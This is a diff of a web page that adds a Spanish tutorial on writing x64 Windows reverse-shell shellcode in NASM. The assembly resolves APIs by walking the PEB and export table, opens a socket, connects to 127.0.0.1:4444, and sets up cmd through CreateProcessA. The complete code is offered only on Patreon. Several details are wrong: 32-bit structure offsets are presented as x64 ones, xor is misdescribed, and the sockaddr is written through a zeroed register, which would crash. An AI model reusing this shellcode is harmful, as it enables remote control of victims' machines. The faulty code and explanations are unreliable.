@@ -65,7 +65,531 @@
     <div class="row mt-5">
       <div class="col">
 
-          <div align="center"></div><h1>En Construcción</h1></div>
+            <p>Una pequeña explicación de como realizar una shell para win64.</p>
+
+<p>Veamos unos conceptos básicos, está explicación es realizado en nasm, esta forma no es única, hay varias formas, todo depende de tu imaginación y de como te atrevas a programarlo.</p>
+
+<p>Explicaré una forma básicas de una shell pequeña, lo demás es bajo tu creatividad y responsabilidad.</p>
+
+<p>Para este tutorial es necesario tener instalado <b>windbg</b> y usar otro debugger como <b>x64dbg</b>.</p>
+
+<p>Algo que debes tener en cuenta para poder realizarlo, es saber manejar registros en ASM y sus ejecuciones, dejo un link a una página donde puedes aprender más.</p>
+
+<a href="https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start">Architecture/x64-assembly</a><br><br>
+
+Conceptos básicos.
+
+
+    <table style="font-family: &quot;Times New Roman&quot;;
+      letter-spacing: normal; orphans: 2; text-indent: 0px;
+      text-transform: none; widows: 2; word-spacing: 0px;
+      -webkit-text-stroke-width: 0px; text-decoration-style: initial;
+      text-decoration-color: initial;" cellspacing="2" cellpadding="2"
+      border="1">
+      
+        <tr>
+          <td valign="top"><br>
+          </td>
+          <td colspan="4" rowspan="1" valign="top" align="center">Registros<br>
+          </td>
+          <td valign="top"><br>
+          </td>
+        </tr>
+        <tr>
+          <td valign="top"><br>
+          </td>
+          <td valign="top">64 bit<br>
+          </td>
+          <td valign="top">32 bit<br>
+          </td>
+          <td valign="top"><b>Explicación</b><br>
+          </td>
+        </tr>
+        <tr>
+          <td valign="top">64 bit<br>
+          </td>
+          <td valign="top">rax, rbx, rcx, rdx, rsi, rdi<br>
+          </td>
+          <td valign="top">---<br>
+          </td>
+          <td valign="top"><a>Los registros a utilizar son rdi, rsi, rdx, r8 - r10, etc.<br>
+          </td>
+        </tr>
+        <tr>
+          <td valign="top">32 bit<br>
+          </td>
+          <td valign="top">---<br>
+          </td>
+          <td valign="top">eax, ebx, ecx, edx, esi, edi<br>
+          </td>
+          <td valign="top">Los registros a utilizar son ebx, edx, ecx, edx, esi, edi, etc.<br>
+          </td>
+        </tr>
+
+    </table>
+    <br>
+    
+    Tipo de datos<br>
+    <table style="font-family: &quot;Times New Roman&quot;;
+      letter-spacing: normal; orphans: 2; text-indent: 0px;
+      text-transform: none; widows: 2; word-spacing: 0px;
+      -webkit-text-stroke-width: 0px; text-decoration-style: initial;
+      text-decoration-color: initial;" cellspacing="2" cellpadding="2"
+      border="1">
+      
+        <tr>
+          <td align="right"><strong>Memoria</strong></td>
+          <td><strong>Bits</strong></td>
+          <td><strong>Bytes</strong></td>
+          <td><strong>Registro</strong></td>
+          <td><strong>Access-Memory</strong></td>
+          <td><strong>Allocate-Memory</strong></td>
+        </tr>
+        <tr>
+          <td>char</td>
+          <td>8</td>
+          <td>1</td>
+          <td>al</td>
+          <td>BYTE [ptr]</td>
+          <td>db</td>
+        </tr>
+        <tr>
+          <td>short</td>
+          <td>16</td>
+          <td>2</td>
+          <td>ax</td>
+          <td>WORD [ptr]</td>
+          <td>dw</td>
+        </tr>
+        <tr>
+          <td>int</td>
+          <td>32</td>
+          <td>4</td>
+          <td>eax</td>
+          <td>DWORD [ptr]</td>
+          <td>dd</td>
+        </tr>
+        <tr>
+          <td>long</td>
+          <td>64</td>
+          <td>8</td>
+          <td>rax</td>
+          <td>QWORD [ptr]</td>
+          <td>dq</td>
+        </tr>
+    </table><br>
+
+ <p><b>Para compilar: nasm -fwin64 -o .obj .nasm<br>
+ld -o .exe .obj</b></p>
+
+<p>Antes que nada, es bueno que entiendan de donde vienen varias cosas que vamos a usar (PEB):</p>
+
+<p>Abran windbg y ataquen un proceso o usen alguna aplicación de 64 bits.</p>
+<p>Veamos lo primero que tenemos que saber, el primer objetivo es <b>TEB</b></p>
+
+<img class="img-fluid" src="img/tuto_x64_1.png"><br><br>
+
+<p>Como podemos observar PEB se encuentra en la posición 12, si lo multiplicamos por cada <b>QWORD</b> obtenemos <b>12*8=96 - 0x60 hex</b></p>
+
+<p>Veamos que pasa si lo seguimos.</p>
+<img class="img-fluid" src="img/tuto_x64_2.png"><br><br>
+
+<p>Ya encontramos PEB, algo que debemos recordar es que hay un registro en ASM que guarda TEB (gs), esto hay que recordarlo para posteriomente usarlo.</p>
+
+<p>Busquemos la dirección para obervar que hay dentro de PEB</p>
+<img class="img-fluid" src="img/tuto_x64_3.png"><br><br>
+<img class="img-fluid" src="img/tuto_x64_4.png"><br><br>
+
+<p>Veamos si la dirección de _PEB_LDR_DATA es correcta</p>
+
+<img class="img-fluid" src="img/tuto_x64_5.png"><br><br>
+
+<p>Tenemos que direccionarnos a <b>"Ldr"</b>, ya que ahí se encuentra una estructura importante a utilizar que es <b>"InMemoryOrderModuleList"</b> y <b>"Flink"</b>.</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">typedef struct _PEB_LDR_DATA {
+  BYTE       Reserved1[8];
+  PVOID      Reserved2[3];
+  LIST_ENTRY InMemoryOrderModuleList;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;</b></pre><br>
+
+<p>Entonces cuales son lo pasos a seguir para encontrar las direcciones que necesitaremos para lograr cargar algunas librerías además de funciones.</p>
+<p><b>TEB<br>->PEB(0x30)<br>->Ldr(0xc)<br>->InMemoryOrderModuleList(0x14)->Flink</b></p>
+
+<p>Lo podemos comprobar de esta forma.</p>
+<img class="img-fluid" src="img/tuto_x64_6.png"><br><br>
+<img class="img-fluid" src="img/tuto_x64_7.png"><br><br>
+
+<p>Como mencionamos en el tutorial de win32, primero se encuentra ntdll y después kernel32, así que solo hay que repetir lo de win32 pero en x64.</p>
+
+<p>Un detalle que tiene win64 es que debes alinear la pila e dejar un espacio llamado "shadow space" para cada registro además de los extras que se vayan a usar, en el tutorial de patreon explico con más detalle.</p>
+
+<pre >xor ecx, ecx
+xor rcx, rcx
+mov rax, [gs:rcx+0x60]
+mov rax, [rax+0x18]
+mov rsi, [rax+0x20]
+lodsq
+xchg rsi, rax
+lodsq
+mov rbx, [rax+0x20]</b></pre><br>
+
+<p><b>lodsq</b> avanza 8 bytes del registro <b>rsi</b> a <b>rax</b> en una estructura, así que sería <b>InMemoryOrderModuleList+8 = flink(ntdll.dll)</b></p>
+<p>Después se hace un xchg para meter <b>rax</b> nuevamente a <b>rsi</b> y volvemos a recorrer 8 bytes para quedar <b>InMemoryOrderModuleList+8=flink+8=flink(kernel32.dll)</b> donde se encuentra la dirección que necesitamos para poder llegar a la base de <b>kernel32.dll</b>.</p>
+
+<p><b>rax+0x20</b>, es por un error en el entry al llegar a la dirección donde solo hay que hacer algo sencillo para solucionarlo, y es sumarle el 0x20.</p>
+
+<p>Logramos obtener la base base de kernerl32 ahora a investigar PE.</p>
+
+<p>La siguiente tabla es importante porque es PE File Format</p>
+<div align="center">----Dos Mz Header----<br>
+----DOS Stub----<br>
+----PE File Header----<br>
+----Image_Optional_Header--<br>
+----Section Table (Data Directories)----<br>
+----Sections----</div><br>
+
+<p>En el tutorial de patreon profundizaré un poco más, ahora solo importa saber como llegar a <b>Data Directories</b>, que es donde empezaremos a buscar las funciones a necesitar.</p>
+<p>Así quedaría entonces...</p>
+<p><b>e_elfanew(0x3c)<br>->OptionalHeader+DataDirectory(0x88)<br>->AddressofNames(0x20)<br></b></p>
+
+<p>Observemos el código. </p>
+
+<pre >
+mov edx, [rbx+0x3c]
+add rdx, rbx
+mov edx, [rdx+0x88]
+add rdx, rbx
+mov esi, [rdx+0x20]
+add rsi, rbx</b></pre><br>
+
+<p>Cada movimiento hay que unirlo a la base de kernel32.</p>
+
+<p>Ya estamos en AddressOfNames, ahora es momento de empezar a la dirección necesaria para cargar librerías y buscar las funciones necesarias y es <b>GetProcAddress.</b></p>
+
+<img class="img-fluid" src="img/tuto_vuln_w32_9.png"><br><br>
+
+<p>En el tutorial de patreon tiene una explicación más detalla sobre porque el uso de AddressOfFunctions, AddressOfNames y AddressOfNameOrdinals</p>
+
+<p>Pero primero tenemos que buscar el nombre, después su ordinal y al final la dirección de la función.</p>
+
+<p><b>-->AddressOfNames - 0x20<br>-->AddressOfNameOrdinals - 0x24<br>-->AddressOfFunctions - 0x1c<br></b></p>
+
+<p>Repetimos el uso de lodsd y vamos buscamos el nombre "GetProcAddress"</p>
+
+<pre>J_Gp:    
+xor rcx, rcx
+mov r10, 0x41636f7250746547
+
+jm_GPA:
+inc rcx                  
+lodsd
+add rax, rbx
+cmp qword[rax], r10
+jnz jm_GPA
+
+dec rcx</pre>
+
+<p>Aquí entramos en una especia de <b>"loop"</b> e <b>"if"</b></p>
+<p>Pueden observar como aumentamos a <b>rcx = 1</b>, metemos a <b>rsi</b> en <b>rax</b>, le colocamos la base de <b>kernel32</b> y vamos comparando cada <b>qword</b> hasta encontrar el nombre correcto.</p>
+
+<p>Al final restamos <b>rcx-1</b>, porque el array de Ordinals empieza en 0 no en 1, así que hay que usar <b>dec rcx</b></p>
+
+<p>Algo importante a notar es que tanto AddressOfNameOrdinals como AddressOfFunctions son arrays, AddressOfNameOrdinals = [word] y AddressOfFucntions = [dword]</p>
+
+<pre>mov esi, [rdx+0x24]
+add rsi, rbx
+mov cx, [rsi+rcx*2]
+mov esi, [rdx+0x1c]
+add rsi, rbx
+mov edx, [rsi+rcx*4]
+add rdx, rbx
+</pre>
+
+<img class="img-fluid" src="img/tuto_x64_8.png"><br><br>
+<img class="img-fluid" src="img/tuto_x64_9.png"><br><br>
+
+<p>Ahora solo queda empezar a cargar la librería sería así.</p>
+<p><b>GetProcAddress(LoadLibrary(ws2_32.dll))</b></p>
+<p>El proceso es repetitivo excepto para los parámetros.</p>
+
+<pre>xor rcx, rcx
+push rcx
+mov rcx, 0x41797261
+push rcx
+mov rcx, 0x7262694c64616f4c
+push rcx
+mov rdx, rsp
+mov rcx, rbx
+sub rsp, 0x30
+
+call r14
+
+mov r13, rax  ;LoadLibrary</pre>
+
+<p>Como se ve en el código, se debe meter en la pila LoadLibraryA0, se une a la base de kernel32 y se invoca con GetProcAddress y guardamos.</p>
+<p>Ya que esta cargada la librería y tenemos la dirección, comenzamos a programar el socket.</p>
+
+<p><b>LoadLibraryA(WSAStartup)</b></p>
+
+<pre>xor rcx, rcx
+push rcx
+mov rcx, 0x6c6c
+push rcx
+mov rcx, 0x642e32335f327377  ;ws2_32.dll
+push rcx
+mov rcx, rsp
+
+sub rsp, 0x30
+call r13</pre>
+
+<p><b>GetProAddress("ws2_32.dll","WSAStartup")</b></p>
+
+<pre>
+xor rcx, rcx
+push rcx
+mov rcx, 0x7075
+push rcx
+mov rcx, 0x7472617453415357 ;WSAStartup
+push rcx
+mov rdx, rsp
+mov rcx, r15
+
+sub rsp, 0x30
+call r14</pre>
+
+<p>Ya que obtuvimos las direcciónes de WSAStartup, debemos empezar con los parámetros.</p>
+
+<p>Antes hay que observar la estructura.</p>
+
+<pre><b>int WSAStartup(
+  WORD      wVersionRequired,
+  LPWSADATA lpWSAData
+);</b></pre>
+
+<pre>wVersionRequested = MAKEWORD( 2, 2 );
+WSAStartup( wVersionRequested, &wsaData );</pre>
+
+<p>En el tutorial de patreon explico esta parte, vamos a continuar.</p>
+
+<pre>xor rcx, rcx
+push rcx
+mov cx, 0x0190
+sub rsp, rcx
+mov rdx, rsp
+call rax</pre>
+
+<p>Tenemos que definir el tamaño de la estructura y abrimos espacio y metemos en la pila la dirección inicial de wsaData <b>sizeof(struct wsaData)</b></p>
+
+<p>Ahora metemos <b>wVersionRequested</b> que es la mayor version 2.2 e invocamos lo guardado en eax.</p>
+
+<p>Volvemos a repetir todo.</p>
+
+<pre>xor rcx, rcx
+mov rcx, 0x4174
+push rcx
+mov rcx, 0x656b636f53415357 ;WSASocketA
+push rcx
+mov rdx, rsp 
+mov rcx, r15
+
+sub rsp, 0x30
+call r14 </pre>
+
+<p><b>GetProAddress("ws2_32.dll","WSASocketA")</b></p>
+
+<p></p>
+
+Tipo de datos<br>
+    <table style="font-family: &quot;Times New Roman&quot;;
+      letter-spacing: normal; orphans: 2; text-indent: 0px;
+      text-transform: none; widows: 2; word-spacing: 0px;
+      -webkit-text-stroke-width: 0px; text-decoration-style: initial;
+      text-decoration-color: initial;" cellspacing="2" cellpadding="2"
+      border="1">
+      
+        <tr>
+          <td align="right"><strong>Domain</strong></td>
+          <td align="center"><strong>Type</strong></td>
+          <td align="left"><strong>Protocol</strong></td>
+          <td align="left"><strong>lpProtocolInfo</strong></td>
+          <td align="left"><strong>Group g</strong></td>
+          <td align="left"><strong>dwFlags</strong></td>
+        </tr>
+        <tr>
+          <td>AF_INET |</td>
+          <td>SOCK_STREAM |</td>
+          <td>IPPROTO_IP</td>
+
+        </tr>
+        <tr>
+          <td align="right">2 |</td>
+          <td align="right">1 |</td>
+          <td align="right">6</td>
+          <td align="right">0|</td>
+          <td align="right">0|</td>
+          <td align="right">0</td>
+        </tr>
+    </table><br>
+
+<p>Con eso podemos saber que es lo que necesitamos, solo hay que meter en cada registro el dato necesario.</p>
+
+<pre>SOCKET WSAAPI WSASocketA(
+  int                 af,
+  int                 type,
+  int                 protocol,
+  LPWSAPROTOCOL_INFOA lpProtocolInfo,
+  GROUP               g,
+  DWORD               dwFlags
+);</pre>
+
+<p>Pero antes debemos saber como meter todos esos datos. La mejor opción es meter todo a la pila, para eso sirven los push.</p>
+
+<p><b>xor</b>, hace una comparación tipo <b>not</b>, por ejemplo, si fuera rax=1, con xor podemos decir: rax=1 not rax=1; resultado = 0 </p>
+
+<p><b>inc</b>, incrementa +1 un registro, por ejemplo, si fuera rax=1, entonces, <b>inc rax</b>, sería ahora rax = 2</p>
+
+<p><b>pop</b>, saca de la pila el ultimo registro guardado, por ejemplo, push 0x1; push 0x2; entonces, <b>pop rax</b>, sería ahora rax = 2, <b>pop rax</b>, entonces ahora rax = 1</p>
+
+<pre>xor rcx, rcx
+mov [rsp+32], rcx
+mov [rsp+40], rcx
+
+push rcx
+pop r9
+mov r8b, 6
+inc rcx
+mov rdx, rcx
+inc rcx
+call rax
+
+mov rdi, rax  ;socket</pre>
+
+<p>¿Cómo quedaría entonces?</p>
+
+<p><b>
+WSASocketA(2,1,6,0,0,0)</b><br><br>
+
+<p>Repetimos lo mismo ahora para darle indicaciones a connect</p>
+
+<pre>xor rcx, rcx
+mov rcx, 0x7463656e6e6f63
+push rcx
+mov rdx, rsp
+mov rcx, r15
+
+sub rsp, 0x28
+call r14</pre>
+
+<pre class="brush: cpp; title: ; notranslate" title=""><b>int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</b></pre>
+
+<p>Veamos la estructura de como de ser usado.</p>
+
+<pre>int WSAAPI connect(
+  SOCKET         s,
+  const sockaddr *name,
+  int            namelen
+);</pre><
+
+<pre>typedef struct sockaddr_in {
+#if ...
+  short          sin_family;
+#else
+  ADDRESS_FAMILY sin_family;
+#endif
+  USHORT         sin_port;
+  IN_ADDR        sin_addr;
+  CHAR           sin_zero[8];
+} SOCKADDR_IN, *PSOCKADDR_IN;</pre>
+
+<p>Aqui debemos pensar en dos cosas, meter en la pila la <b>IP</b>, el <b>Puerto</b> y la <b>familia</b>.</p>
+
+<p>Veamos como quedaría.</p>
+
+<pre>xor r14, r14
+mov [r14+4], dword 0x0100007f
+mov [r14+2], word 0x5c11
+mov [r14], word 0x2
+
+ </pre>
+
+Guardamos eso en la pila y volvemos a repetir pero ahora para la estructura.
+<pre>      
+mov r8b, 16       <--sizeof(sockaddre)
+lea rdx, [r14]    <--sockaddr_in
+mov rcx, rdi      <--socket
+
+call rax          <--connect</pre>
+
+<p>Ya tenemos lista la conexión, pero falta como crear una tubería para mandar y recibir datos. Para eso usaremos <b>CreateProcessA</b>.</p>
+
+<p>Esta parte voy a colocar la estructura y si ya se entendió todo, será sencillo repetir todo.</p>
+
+<p>Es cuestion de volver a buscar desde <b>PE File Format</b> y encontrar CreateProcessA.</p>
+
+<pre>BOOL CreateProcessA(
+  LPCSTR                lpApplicationName,
+  LPSTR                 lpCommandLine,
+  LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  BOOL                  bInheritHandles,
+  DWORD                 dwCreationFlags,
+  LPVOID                lpEnvironment,
+  LPCSTR                lpCurrentDirectory,
+  LPSTARTUPINFOA        lpStartupInfo,
+  LPPROCESS_INFORMATION lpProcessInformation
+);</pre>
+
+<p>Hagamos un adelanto.</p>
+
+<p>Aquí necesitas establecer dos cosas importantes de la estructura</p>
+
+<pre>LPSTARTUPINFOA        lpStartupInfo,
+LPPROCESS_INFORMATION lpProcessInformation</pre>
+
+<pre>lpStartupInfo es la cantidad de bytes 104 bytes + 24 de pProcessInformation</pre>
+
+<p>En el tutorial de patreon pondré más detallado esto pero dejo la estructura para que puedan continuar.</p>
+
+<pre>STRUC _STARTUPINFOA
+    .cb:                resq 1
+    .lpReserved:        resq 1
+    .lpDesktop:         resq 1
+    .lpTitle:           resq 1
+    .dwX:               resd 1
+    .dwY:               resd 1
+    .dwXSize:           resd 1
+    .dwYSize:           resd 1
+    .dwXCountChars:     resd 1
+    .dwYCountChars:     resd 1
+    .dwFillAttribute:   resd 1
+    .dwFlags:           resd 1
+    .wShowWindow:       resd 1
+    .cbReserved2:       resd 1
+    .lpReserved2:       resq 1
+    .hStdInput:         resq 1
+    .hStdOutput:        resq 1
+    .hStdError:         resq 1
+ENDSTRUC
+
+STRUC _PROCESS_INFORMATION
+    .hProcess:          resq 1
+    .hThread:           resq 1
+    .dwProcessId:       resd 1
+    .dwThreadId:        resd 1
+ENDSTRUC</pre>
+
+<p>Metamos a la pila <b>cmd</b>, que es la consola de comandos.</p>
+
+<pre>push 'cmdA'
+mov [rsp+3],byte cl
+lea rdx, [rsp]    ;cmd</pre>
+
+<p>Y ya al final es solo darle parámetros a CreateProcessA con esto que acabamos de ver según la estructura.</p>
+
+<p>Listo.</p>
+
+<p>Si deseas el código completo puede apoyarme en patreon, ahí encontraras el código y más. <a href="https://www.patreon.com/BGPavelAng">Patreon</a></p>
+<p>En github se encuentra parte del código como referencia. <a href="https://github.com/BGPavelAng">Github</a></p>
       </div>
 
     </div>
